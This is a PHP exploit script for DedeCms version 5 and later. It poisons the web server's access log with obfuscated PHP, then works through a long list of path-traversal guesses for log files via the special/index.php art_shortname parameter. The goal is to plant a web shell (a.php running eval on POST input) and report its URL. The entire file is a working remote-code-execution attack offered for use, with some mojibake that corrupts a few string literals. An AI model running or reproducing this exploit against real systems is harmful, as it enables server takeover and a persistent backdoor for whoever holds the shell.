<?php
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
print_r('
--------------------------------------------------------------------------------
DedeCms >=5 Remote Code Execution Exploit
BY Flyh4t
just work as register_globals=on
www.wolvez.org
--------------------------------------------------------------------------------
');

if ($argc<3) {
print_r('
--------------------------------------------------------------------------------
Usage: php '.$argv[0].' host path
host: target server (ip/hostname)
path: path to DEDEcms
Example:
php '.$argv[0].' localhost /
¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¨C
');
die;
}

function sendpacketii($packet)
{
global $host, $html;
$ock=fsockopen(gethostbyname($host),'80');
if (!$ock) {
echo 'No response from '.$host; die;
}
fputs($ock,$packet);
$html=¡±;
while (!feof($ock)) {
$html.=fgets($ock);
}
fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$code="<?php fputs(fopen(chr(46).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(93).chr(41).chr(59).chr(63).chr(62).chr(112).chr(112).chr(112).chr(112));?>";
$shell = 'http://'.$host.$path.'special/a.php';
/**
 * a.php has this code:
 * <?eval($_POST[a])?>
**/

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}

$packet="GET " . $path . $code . " HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$packet.="Host: " . $host . "\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacketii($packet);
sleep(3);

$paths= array (
"/../../../../../var/log/httpd/access_log",
"/../../../../../var/log/httpd/error_log",
"/../../../../../../var/log/httpd/access_log",
"/../../../../../../var/log/httpd/error_log",
"/../../../../../../../var/log/httpd/access_log",
"/../../../../../../../var/log/httpd/error_log",
"/../../apache/logs/error.log",
"/../../apache/logs/access.log",
"/../../../apache/logs/error.log",
"/../../../apache/logs/access.log",
"/../../../../apache/logs/error.log",
"/../../../../apache/logs/access.log",
"/../../../../../apache/logs/error.log",
"/../../../../../apache/logs/access.log",
"/../../../../../../apache/logs/error.log",
"/../../../../../../apache/logs/access.log",
"/../../../../../../../apache/logs/error.log",
"/../../../../../../../apache/logs/access.log",
"/../../apache2.2/logs/error.log",
"/../../apache2.2/logs/access.log",
"/../../../apache2.2/logs/error.log",
"/../../../apache2.2/logs/access.log",
"/../../../../apache2.2/logs/error.log",
"/../../../../apache2.2/logs/access.log",
"/../../../../../apache2.2/logs/error.log",
"/../../../../../apache2.2/logs/access.log",
"/../../../../../../apache2.2/logs/error.log",
"/../../../../../../apache2.2/logs/access.log",
"/../../../../../../../apache2.2/logs/error.log",
"/../../../../../../../apache2.2/logs/access.log",
"/../../../../../logs/error.log",
"/../../../../../logs/access.log",
"/../../../../../../logs/error.log",
"/../../../../../../logs/access.log",
"/../../../../../../../logs/error.log",
"/../../../../../../../logs/access.log",
"/../../../../../etc/httpd/logs/access_log",
"/../../../../../etc/httpd/logs/access.log",
"/../../../../../etc/httpd/logs/error_log",
"/../../../../../etc/httpd/logs/error.log",
"/../../../../../../etc/httpd/logs/access_log",
"/../../../../../../etc/httpd/logs/access.log",
"/../../../../../../etc/httpd/logs/error_log",
"/../../../../../../etc/httpd/logs/error.log",
"/../../../../../../../etc/httpd/logs/access_log",
"/../../../../../../../etc/httpd/logs/access.log",
"/../../../../../../../etc/httpd/logs/error_log",
"/../../../../../../../etc/httpd/logs/error.log",
"/../../../../../usr/local/apache/logs/access_log",
"/../../../../../usr/local/apache/logs/access.log",
"/../../../../../../usr/local/apache/logs/access_log",
"/../../../../../../usr/local/apache/logs/access.log",
"/../../../../../../../usr/local/apache/logs/access_log",
"/../../../../../../../usr/local/apache/logs/access.log",
"/../../../../../usr/local/apache/logs/error_log",
"/../../../../../usr/local/apache/logs/error.log",
"/../../../../../../usr/local/apache/logs/error_log",
"/../../../../../../usr/local/apache/logs/error.log",
"/../../../../../../../usr/local/apache/logs/error_log",
"/../../../../../../../usr/local/apache/logs/error.log",
"/../../../../../var/log/apache/access_log",
"/../../../../../var/log/apache/access.log",
"/../../../../../../var/log/apache/access_log",
"/../../../../../../var/log/apache/access.log",
"/../../../../../../../var/log/apache/access_log",
"/../../../../../../../var/log/apache/access.log",
"/../../../../../../var/log/apache/error_log",
"/../../../../../../var/log/apache/error.log",
"/../../../../../../../var/log/apache/error_log",
"/../../../../../../../var/log/apache/error.log",
"/../../../../../../../../var/log/apache/error_log",
"/../../../../../../../../var/log/apache/error.log",
"/../../../../../var/log/access_log",
"/../../../../../var/log/access.log",
"/../../../../../../var/log/access_log",
"/../../../../../../var/log/access.log",
"/../../../../../../../var/log/access_log",
"/../../../../../../../var/log/access.log",
"/../../../../../var/log/error_log",
"/../../../../../var/log/error.log",
"/../../../../../../var/log/error_log",
"/../../../../../../var/log/error.log",
"/../../../../../../../var/log/error_log",
"/../../../../../../../var/log/error.log",
"/../../../../../var/www/logs/access_log",
"/../../../../../var/www/logs/access.log",
"/../../../../../../var/www/logs/access_log",
"/../../../../../../var/www/logs/access.log",
"/../../../../../../../var/www/logs/access_log",
"/../../../../../../../var/www/logs/access.log",
"/../../../../../var/www/logs/error_log",
"/../../../../../var/www/logs/error.log",
"/../../../../../../var/www/logs/error_log",
"/../../../../../../var/www/logs/error.log",
"/../../../../../../../var/www/logs/error_log",
"/../../../../../../../var/www/logs/error.log",
);

for ($i=0; $i<=count($paths)-1; $i++)
{
$a=$i+2;
$packet ="GET " . $path . "special/index.php?art_shortname=" . $paths[$i] . " HTTP/1.1\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$packet.="Host: " . $host . "\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (file_get_contents($shell) == 'pppp')
exit("Expoilt Success!\nView Your shell:\t$shell\n");
}
exit("Exploit Failed!\n");
?>

